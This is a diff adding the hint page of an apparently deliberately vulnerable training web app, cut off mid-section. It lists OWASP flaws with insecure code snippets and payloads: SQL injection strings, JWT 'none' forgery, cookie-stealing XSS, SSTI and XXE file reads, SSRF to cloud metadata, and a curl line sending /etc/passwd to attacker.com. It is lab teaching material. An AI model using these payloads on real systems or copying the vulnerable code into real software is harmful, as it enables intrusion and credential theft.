@@ -1,0 +1,1890 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NULL: HACKER GUIDE - Vulnerability Training Archive</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: #000;
+            color: #00ff88;
+            font-family: 'Fira Code', 'Share Tech Mono', monospace;
+            overflow-x: hidden;
+        }
+        
+        /* Animated cyber grid background */
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: grid-scroll 20s linear infinite;
+            z-index: 0;
+        }
+        
+        @keyframes grid-scroll {
+            0% { transform: perspective(500px) rotateX(60deg) translateY(0); }
+            100% { transform: perspective(500px) rotateX(60deg) translateY(50px); }
+        }
+        
+        /* Scanline effect */
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                rgba(0, 255, 136, 0) 0%,
+                rgba(0, 255, 136, 0.02) 50%,
+                rgba(0, 255, 136, 0) 100%
+            );
+            background-size: 100% 3px;
+            animation: scan 8s linear infinite;
+            pointer-events: none;
+            z-index: 999;
+        }
+        
+        @keyframes scan {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100vh; }
+        }
+        
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Epic glowing header */
+        .hacker-header {
+            font-family: 'Orbitron', monospace;
+            font-size: 5rem;
+            font-weight: 900;
+            text-align: center;
+            margin: 80px 0 30px;
+            background: linear-gradient(45deg, #00ff88, #0ff, #00ff88, #0ff);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradient-flow 3s ease infinite, glow-pulse 2s ease-in-out infinite;
+            position: relative;
+            text-shadow: 0 0 80px rgba(0, 255, 136, 0.8);
+        }
+        
+        @keyframes gradient-flow {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        
+        @keyframes glow-pulse {
+            0%, 100% { filter: brightness(1) drop-shadow(0 0 20px #00ff88); }
+            50% { filter: brightness(1.5) drop-shadow(0 0 40px #0ff); }
+        }
+        
+        .subtitle {
+            text-align: center;
+            font-size: 1.5rem;
+            color: #0ff;
+            margin-bottom: 60px;
+            letter-spacing: 3px;
+            animation: flicker 3s infinite;
+        }
+        
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            45% { opacity: 1; }
+            50% { opacity: 0.8; }
+            55% { opacity: 1; }
+        }
+        
+        /* Terminal-style navigation */
+        .terminal-nav {
+            background: rgba(0, 20, 10, 0.8);
+            border: 2px solid #00ff88;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 50px;
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.3), inset 0 0 30px rgba(0, 255, 136, 0.05);
+        }
+        
+        .terminal-nav::before {
+            content: 'NULL:~$ ls -la /vulnerabilities';
+            display: block;
+            color: #0ff;
+            margin-bottom: 15px;
+            font-family: 'Fira Code', monospace;
+            font-size: 1.1rem;
+        }
+        
+        .nav-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        .nav-link {
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid #00ff88;
+            padding: 12px 20px;
+            text-decoration: none;
+            color: #00ff88;
+            transition: all 0.3s;
+            display: block;
+            text-align: center;
+            border-radius: 5px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .nav-link::before {
+            content: '>';
+            position: absolute;
+            left: 10px;
+            opacity: 0;
+            transition: all 0.3s;
+        }
+        
+        .nav-link:hover {
+            background: rgba(0, 255, 136, 0.2);
+            border-color: #0ff;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.4);
+            padding-left: 30px;
+            color: #0ff;
+        }
+        
+        .nav-link:hover::before {
+            opacity: 1;
+            left: 15px;
+        }
+        
+        /* Vulnerability cards */
+        .vuln-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+            gap: 30px;
+            margin: 40px 0;
+        }
+        
+        .vuln-card {
+            background: rgba(0, 20, 10, 0.6);
+            border: 2px solid #00ff88;
+            border-radius: 15px;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s;
+            box-shadow: 0 5px 30px rgba(0, 255, 136, 0.1);
+        }
+        
+        .vuln-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: card-shine 6s infinite;
+        }
+        
+        @keyframes card-shine {
+            0%, 100% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            50% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .vuln-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            border-color: #0ff;
+            box-shadow: 0 15px 60px rgba(0, 255, 136, 0.4);
+        }
+        
+        .vuln-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .vuln-icon {
+            font-size: 3rem;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .vuln-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #0ff;
+            text-shadow: 0 0 10px #0ff;
+        }
+        
+        .severity {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            padding: 8px 16px;
+            border-radius: 5px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+            z-index: 1;
+            animation: pulse-severity 2s infinite;
+        }
+        
+        @keyframes pulse-severity {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .severity.critical {
+            background: rgba(255, 0, 64, 0.3);
+            border: 2px solid #ff0040;
+            color: #ff0040;
+            box-shadow: 0 0 20px rgba(255, 0, 64, 0.5);
+        }
+        
+        .severity.high {
+            background: rgba(255, 136, 0, 0.3);
+            border: 2px solid #ff8800;
+            color: #ff8800;
+            box-shadow: 0 0 20px rgba(255, 136, 0, 0.5);
+        }
+        
+        .severity.medium {
+            background: rgba(255, 255, 0, 0.3);
+            border: 2px solid #ffff00;
+            color: #ffff00;
+            box-shadow: 0 0 20px rgba(255, 255, 0, 0.5);
+        }
+        
+        .vuln-description {
+            line-height: 1.8;
+            margin-bottom: 20px;
+            color: #00ff88;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hint-box {
+            background: rgba(0, 255, 255, 0.05);
+            border-left: 4px solid #0ff;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hint-box::before {
+            content: '💡 HINT: ';
+            color: #0ff;
+            font-weight: bold;
+        }
+        
+        .challenge-box {
+            background: rgba(255, 0, 64, 0.05);
+            border: 1px dashed #ff0040;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .challenge-box::before {
+            content: '🎯 CHALLENGE: ';
+            color: #ff0040;
+            font-weight: bold;
+        }
+        
+        .code-example {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #00ff88;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .code-example::before {
+            content: '// Vulnerable Code Example';
+            display: block;
+            color: #ff0040;
+            margin-bottom: 10px;
+            font-size: 0.8rem;
+        }
+        
+        .endpoint-badge {
+            display: inline-block;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid #00ff88;
+            padding: 5px 12px;
+            border-radius: 3px;
+            font-size: 0.85rem;
+            margin: 5px 5px 5px 0;
+            color: #00ff88;
+        }
+        
+        /* Collapse/Expand */
+        .expand-btn {
+            background: transparent;
+            border: 1px solid #0ff;
+            color: #0ff;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin-top: 15px;
+            border-radius: 5px;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.3s;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .expand-btn:hover {
+            background: #0ff;
+            color: #000;
+            box-shadow: 0 0 20px #0ff;
+        }
+        
+        .expanded-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease;
+        }
+        
+        .expanded-content.active {
+            max-height: 2000px;
+        }
+        
+        /* Statistics dashboard */
+        .stats-dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 50px 0;
+        }
+        
+        .stat-card {
+            background: rgba(0, 20, 10, 0.6);
+            border: 2px solid #00ff88;
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            border-color: #0ff;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.3);
+        }
+        
+        .stat-number {
+            font-size: 3rem;
+            font-weight: 900;
+            color: #0ff;
+            font-family: 'Orbitron', monospace;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px #0ff;
+        }
+        
+        .stat-label {
+            color: #00ff88;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.9rem;
+        }
+        
+        /* Warning banner */
+        .warning-banner {
+            background: rgba(255, 0, 64, 0.1);
+            border: 2px solid #ff0040;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 40px 0;
+            text-align: center;
+            animation: pulse-warning 3s infinite;
+        }
+        
+        @keyframes pulse-warning {
+            0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 64, 0.3); }
+            50% { box-shadow: 0 0 30px rgba(255, 0, 64, 0.6); }
+        }
+        
+        .warning-banner h2 {
+            color: #ff0040;
+            font-family: 'Orbitron', monospace;
+            font-size: 2rem;
+            margin-bottom: 15px;
+        }
+        
+        @media (max-width: 768px) {
+            .hacker-header { font-size: 2.5rem; }
+            .subtitle { font-size: 1rem; }
+            .vuln-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="cyber-grid"></div>
+    <div class="scanline"></div>
+    
+    <div class="container">
+        <h1 class="hacker-header">⚡ NULL: HACKER GUIDE ⚡</h1>
+        <div class="subtitle">[ VULNERABILITY TRAINING ARCHIVE - NO ANSWERS GIVEN ]</div>
+        
+        <div class="terminal-nav">
+            <div class="nav-links">
+                <a href="/" class="nav-link">Home</a>
+                <a href="/cases" class="nav-link">Cases</a>
+                <a href="/donate" class="nav-link">Donate</a>
+                <a href="/subscribe" class="nav-link">Inner Circle</a>
+            </div>
+        </div>
+        
+        <div class="warning-banner">
+            <h2>⚠ ETHICAL HACKING ONLY ⚠</h2>
+            <p>This platform is for security training purposes. All vulnerabilities are intentional.</p>
+            <p>Use this knowledge responsibly to defend systems, not attack them.</p>
+            <p><strong>Unauthorized access to real systems is ILLEGAL.</strong></p>
+        </div>
+        
+        <div class="stats-dashboard">
+            <div class="stat-card">
+                <div class="stat-number">105+</div>
+                <div class="stat-label">Vulnerabilities</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">10</div>
+                <div class="stat-label">OWASP Top 10</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">100+</div>
+                <div class="stat-label">Endpoints</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">∞</div>
+                <div class="stat-label">Learning Paths</div>
+            </div>
+        </div>
+        
+        <div class="vuln-grid">
+            <!-- SQL Injection -->
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">💉</span>
+                    <h2 class="vuln-title">SQL Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    One of the most devastating attacks. Allows attackers to manipulate database queries, bypassing authentication and extracting sensitive data.
+                </div>
+                <div class="hint-box">
+                    Look at the login form. Notice how user input might be directly concatenated into SQL queries. What if you could "escape" from the intended query structure?
+                </div>
+                <div class="challenge-box">
+                    Can you log in without knowing any valid password? Try thinking about how SQL WHERE clauses work. What would make a condition always evaluate to true?
+                </div>
+                <div class="code-example">
+const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/auth/login</span>
+                <span class="endpoint-badge">GET /api/cases/search</span>
+                <span class="endpoint-badge">GET /api/cases/exists/:id</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Think about SQL comment syntax (-- or #)</p>
+                    <p>• Consider boolean logic (OR operators)</p>
+                    <p>• The classic: ' OR '1'='1</p>
+                    <p>• Try different quote types: single (') vs double (")</p>
+                    <p>• Look for error messages that reveal query structure</p>
+                    <p>• Blind SQLi uses timing: SLEEP(), WAITFOR DELAY</p>
+                </div>
+            </div>
+            
+            <!-- Broken Authentication -->
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔓</span>
+                    <h2 class="vuln-title">Broken Authentication</h2>
+                </div>
+                <div class="vuln-description">
+                    Multiple authentication weaknesses exist. JWT tokens are improperly validated, sessions persist unnecessarily, and password reset mechanisms are flawed.
+                </div>
+                <div class="hint-box">
+                    JWT tokens have three parts: header, payload, signature. What if the signature isn't properly verified? Also check how tokens are decoded vs verified.
+                </div>
+                <div class="challenge-box">
+                    Can you access admin functionality without the admin password? Look at how JWTs are handled. Can you modify the payload? What about the 'algorithm' field?
+                </div>
+                <div class="code-example">
+const decoded = jwt.decode(token);  // No verification!
+if (decoded) { return decoded; }
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/auth/verify-token</span>
+                <span class="endpoint-badge">POST /api/auth/forgot-password</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• jwt.decode() vs jwt.verify() - big difference!</p>
+                    <p>• Try changing the 'alg' header to 'none'</p>
+                    <p>• Modify role/isSubscribed in JWT payload</p>
+                    <p>• Password reset tokens in /api/auth/forgot-password response</p>
+                    <p>• Cookies set without HttpOnly flag - accessible via JavaScript</p>
+                </div>
+            </div>
+            
+            <!-- IDOR -->
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔑</span>
+                    <h2 class="vuln-title">Insecure Direct Object Reference (IDOR)</h2>
+                </div>
+                <div class="vuln-description">
+                    Access other users' data by simply changing ID numbers in the URL. No authorization checks verify you should see that data.
+                </div>
+                <div class="hint-box">
+                    When you view your own profile, notice the user ID in the URL. What happens if you increment or decrement that number? Are there any checks preventing you from accessing other users?
+                </div>
+                <div class="challenge-box">
+                    Can you view the admin's profile (user ID: 1)? Can you modify another user's data? Try PUT requests with different user IDs.
+                </div>
+                <div class="code-example">
+app.get('/api/user/:id', async (req, res) => {
+    const user = await dbGet('SELECT * FROM users WHERE id = ?', [req.params.id]);
+    res.json(user);  // No auth check!
+});
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/user/:id</span>
+                <span class="endpoint-badge">PUT /api/user/:id</span>
+                <span class="endpoint-badge">GET /api/donations/:userId</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try user IDs: 1 (admin), 2, 3, 4</p>
+                    <p>• Look at the response - plaintext passwords exposed!</p>
+                    <p>• PUT /api/user/:id accepts role changes</p>
+                    <p>• Change your own role to 'admin' via IDOR</p>
+                    <p>• No session validation on these endpoints</p>
+                </div>
+            </div>
+            
+            <!-- XSS -->
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎭</span>
+                    <h2 class="vuln-title">Cross-Site Scripting (XSS)</h2>
+                </div>
+                <div class="vuln-description">
+                    Inject malicious JavaScript that executes in other users' browsers. Both stored (persistent) and reflected XSS vulnerabilities exist.
+                </div>
+                <div class="hint-box">
+                    User input is rendered directly into HTML without sanitization. Try injecting &lt;script&gt; tags in comments, search queries, and URL parameters.
+                </div>
+                <div class="challenge-box">
+                    Can you make an alert box appear? Try posting comments with JavaScript code. Also check the /error endpoint with a 'message' parameter.
+                </div>
+                <div class="code-example">
+// Reflected XSS
+res.send(`&lt;p&gt;${message}&lt;/p&gt;`);
+
+// Stored XSS  
+await dbRun('INSERT INTO comments (content) VALUES (?)', [userInput]);
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/comments</span>
+                <span class="endpoint-badge">GET /error?message=</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Basic payload: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
+                    <p>• Try: &lt;img src=x onerror=alert(1)&gt;</p>
+                    <p>• Stored XSS in case comments persists</p>
+                    <p>• Reflected XSS in /error?message=&lt;script&gt;...&lt;/script&gt;</p>
+                    <p>• Cookie theft: document.cookie in your XSS payload</p>
+                </div>
+            </div>
+            
+            <!-- Command Injection -->
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">💻</span>
+                    <h2 class="vuln-title">Command Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    User input is passed directly to system shell commands. Allows arbitrary command execution on the server.
+                </div>
+                <div class="hint-box">
+                    The report submission feature logs data using shell commands. Think about shell command separators and how to chain multiple commands together.
+                </div>
+                <div class="challenge-box">
+                    Can you make the server execute your own commands? Try characters like ; & | or $() in the report title field.
+                </div>
+                <div class="code-example">
+const logCommand = `echo "Report: ${title}" >> reports.log`;
+exec(logCommand);  // Dangerous!
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/report</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Windows: title; whoami or title & dir</p>
+                    <p>• Linux: title; ls -la or title $(whoami)</p>
+                    <p>• Command separators: ; && || | &</p>
+                    <p>• Try: test; curl http://attacker.com?data=$(cat /etc/passwd)</p>
+                    <p>• Backticks and $() for command substitution</p>
+                </div>
+            </div>
+            
+            <!-- SSTI -->
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📝</span>
+                    <h2 class="vuln-title">Server-Side Template Injection (SSTI)</h2>
+                </div>
+                <div class="vuln-description">
+                    User input is rendered as template code. The EJS template engine evaluates your input, allowing code execution on the server.
+                </div>
+                <div class="hint-box">
+                    When adding notes to cases, the content is processed by EJS. Template engines use special delimiters like <%= %> to execute code. Can you break out of plain text?
+                </div>
+                <div class="challenge-box">
+                    Can you execute JavaScript on the server side? Try EJS syntax in case notes. Access server-side variables or require modules.
+                </div>
+                <div class="code-example">
+const rendered = ejs.render(content, { 
+    caseId: caseId, 
+    secret: 'CLASSIFIED_INTEL_2024',
+    apiKeys: API_KEYS 
+});
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/cases/:id/notes</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• EJS syntax: &lt;%= expression %&gt; for output</p>
+                    <p>• Try: &lt;%= 7*7 %&gt; to test</p>
+                    <p>• Access variables: &lt;%= secret %&gt; or &lt;%= apiKeys %&gt;</p>
+                    <p>• Read files: &lt;%= require('fs').readFileSync('/etc/passwd').toString() %&gt;</p>
+                    <p>• Execute commands: &lt;%= require('child_process').execSync('whoami').toString() %&gt;</p>
+                </div>
+            </div>
+            
+            <!-- XXE -->
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📄</span>
+                    <h2 class="vuln-title">XML External Entity (XXE)</h2>
+                </div>
+                <div class="vuln-description">
+                    The whistleblower form accepts XML data. If the parser isn't configured properly, external entities can read local files or perform SSRF attacks.
+                </div>
+                <div class="hint-box">
+                    Check how the whistleblower submission sends data - it builds XML. The DOCTYPE declaration can define external entities that reference local files.
+                </div>
+                <div class="challenge-box">
+                    Can you read server files using XXE? Define an entity pointing to file:///etc/passwd or C:\Windows\System32\drivers\etc\hosts and reference it in the XML.
+                </div>
+                <div class="code-example">
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE report [
+  &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;report&gt;&lt;content&gt;&file;&lt;/content&gt;&lt;/report&gt;
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/whistleblower/submit</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Define external entity in DOCTYPE</p>
+                    <p>• Reference it in XML body: &entity;</p>
+                    <p>• Try reading: /etc/passwd, /etc/hosts</p>
+                    <p>• Windows: C:\Windows\win.ini</p>
+                    <p>• Can also be used for SSRF to internal services</p>
+                </div>
+            </div>
+            
+            <!-- SSRF -->
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌐</span>
+                    <h2 class="vuln-title">Server-Side Request Forgery (SSRF)</h2>
+                </div>
+                <div class="vuln-description">
+                    The evidence vault download feature fetches URLs provided by users. This allows you to make the server request internal resources or scan internal networks.
+                </div>
+                <div class="hint-box">
+                    When downloading evidence files, you provide a URL. The server makes the request for you. Can you make it request localhost or internal IP addresses?
+                </div>
+                <div class="challenge-box">
+                    Can you access internal services? Try URLs like http://localhost:3000/debug or http://127.0.0.1/admin. Can you scan for other internal ports?
+                </div>
+                <div class="code-example">
+// User controls the URL!
+const response = await fetch(userProvidedUrl);
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/download</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: http://localhost:3000/api/admin/users</p>
+                    <p>• Internal IPs: 127.0.0.1, 0.0.0.0, 192.168.x.x</p>
+                    <p>• Cloud metadata: http://169.254.169.254/latest/meta-data/</p>
+                    <p>• Port scanning: try different ports on localhost</p>
+                    <p>• File protocol: file:///etc/passwd</p>
+                </div>
+            </div>
+            
+            <!-- File Upload -->
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📤</span>
+                    <h2 class="vuln-title">Unrestricted File Upload</h2>
+                </div>
+                <div class="vuln-description">
+                    No file type validation or content checking. Upload any file type including executables, scripts, or malicious files.
+                </div>
+                <div class="hint-box">
+                    The evidence upload accepts ANY file type. No extension checking, no content-type validation, no scanning. Filenames are preserved exactly as uploaded.
+                </div>
+                <div class="challenge-box">
+                    Can you upload a .php, .jsp, or .exe file? Can you upload a web shell? What about files with double extensions like shell.php.jpg?
+                </div>
+                <div class="code-example">
+// NO VALIDATION!
+const storage = multer.diskStorage({
+    filename: (req, file, cb) => {
+        cb(null, file.originalname);  // Dangerous!
+    }
+});
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/upload</span>
+                <span class="endpoint-badge">POST /api/whistleblower/submit</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Upload .html files with XSS payloads</p>
+                    <p>• Try executable extensions: .exe, .sh, .bat</p>
+                    <p>• Web shells: .php, .jsp, .aspx (if processed)</p>
+                    <p>• Path traversal in filename: ../../../evil.sh</p>
+                    <p>• Files stored in public/uploads/ directory</p>
+                </div>
+            </div>
+            
+            <!-- Sensitive Data Exposure -->
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔐</span>
+                    <h2 class="vuln-title">Sensitive Data Exposure</h2>
+                </div>
+                <div class="vuln-description">
+                    Passwords stored in plaintext. API keys hardcoded. JWT secrets exposed. Backup files accessible. Debug endpoints reveal environment variables.
+                </div>
+                <div class="hint-box">
+                    Look for common backup file names and debug endpoints. Check /backup.zip, /database.sqlite, /.git, /debug. User API responses include plaintext passwords.
+                </div>
+                <div class="challenge-box">
+                    Can you find the database dump? What about API keys? Try accessing /backup.zip or /debug. Check user API responses for password fields.
+                </div>
+                <div class="code-example">
+// Plaintext passwords in database
+const user = { 
+    id: 1, 
+    email: 'admin@null.org', 
+    password: 's3cr3t_p4ss!'  // Not hashed!
+};
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /backup.zip</span>
+                <span class="endpoint-badge">GET /database.sqlite</span>
+                <span class="endpoint-badge">GET /api/user/:id</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• /backup.zip contains full database dump + secrets</p>
+                    <p>• /database.sqlite exposes user table with plaintext passwords</p>
+                    <p>• GET /api/user/1 includes password field</p>
+                    <p>• JWT_SECRET exposed in multiple places</p>
+                    <p>• API keys in responses and source code</p>
+                </div>
+            </div>
+            
+            <!-- Broken Access Control -->
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🚫</span>
+                    <h2 class="vuln-title">Broken Access Control</h2>
+                </div>
+                <div class="vuln-description">
+                    Admin console accessible without authentication. Users can modify their own roles. Subscription bypass via parameter manipulation.
+                </div>
+                <div class="hint-box">
+                    The admin panel is "hidden" but not protected. Try common admin URLs. For subscription, look at what parameters the API accepts - especially boolean flags.
+                </div>
+                <div class="challenge-box">
+                    Can you access the admin console at /secret-admin-console? Can you subscribe without paying by manipulating request parameters?
+                </div>
+                <div class="code-example">
+// No auth check!
+app.get('/secret-admin-console', (req, res) => {
+    res.sendFile('admin.html');
+});
+
+// Trust client-side flag
+if (isSubscribed === true) {
+    await dbRun('UPDATE users SET isSubscribed = 1');
+}
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /secret-admin-console</span>
+                <span class="endpoint-badge">POST /api/subscribe</span>
+                <span class="endpoint-badge">PUT /api/user/:id</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Navigate directly to /secret-admin-console</p>
+                    <p>• Subscribe with: {"isSubscribed": true} in POST body</p>
+                    <p>• Change role via PUT /api/user/:id with {"role": "admin"}</p>
+                    <p>• Inner circle page: /inner-circle-secret-archives</p>
+                    <p>• No session validation on admin routes</p>
+                </div>
+            </div>
+            
+            <!-- Open Redirect -->
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">↗️</span>
+                    <h2 class="vuln-title">Open Redirect</h2>
+                </div>
+                <div class="vuln-description">
+                    Unvalidated redirect endpoint. Useful for phishing attacks by making malicious links appear to come from a trusted domain.
+                </div>
+                <div class="hint-box">
+                    The /redirect endpoint takes a URL parameter and redirects to it without validation. Craft links that appear legitimate but redirect to attacker sites.
+                </div>
+                <div class="challenge-box">
+                    Can you create a link that starts with this domain but redirects to evil.com? Try /redirect?url=https://evil.com
+                </div>
+                <div class="code-example">
+app.get('/redirect', (req, res) => {
+    const { url } = req.query;
+    res.redirect(url);  // No validation!
+});
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /redirect?url=</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Craft: http://localhost:3000/redirect?url=https://evil.com</p>
+                    <p>• Looks trustworthy but redirects to attacker site</p>
+                    <p>• Perfect for phishing campaigns</p>
+                    <p>• Can bypass URL filters in emails</p>
+                    <p>• Try javascript: URLs for XSS combo</p>
+                </div>
+            </div>
+            
+            <!-- Mass Assignment -->
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
